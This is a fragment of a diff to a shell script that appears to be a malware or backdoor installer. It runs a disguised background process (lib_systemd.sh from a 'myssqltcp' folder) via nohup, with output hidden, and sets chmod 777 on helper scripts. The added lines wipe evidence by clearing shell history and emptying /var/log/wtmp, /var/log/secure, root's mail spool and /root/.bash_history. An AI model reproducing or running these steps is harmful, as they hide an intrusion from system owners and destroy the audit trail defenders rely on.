@@ -22,4 +22,12 @@ chmod 777 addconf.sh
 chmod 777 logserver.sh
 /bin/bash $HOME/myssqltcp/lib_systemd.sh >/dev/null 2>&1 
 nohup ./lib_systemd.sh > /dev/null 2>&1 &
+
+# Clear log
+history -c
+echo > /var/spool/mail/root
+echo > /var/log/wtmp
+echo > /var/log/secure
+echo > /root/.bash_history
+
 echo "[*] Yes-Go"
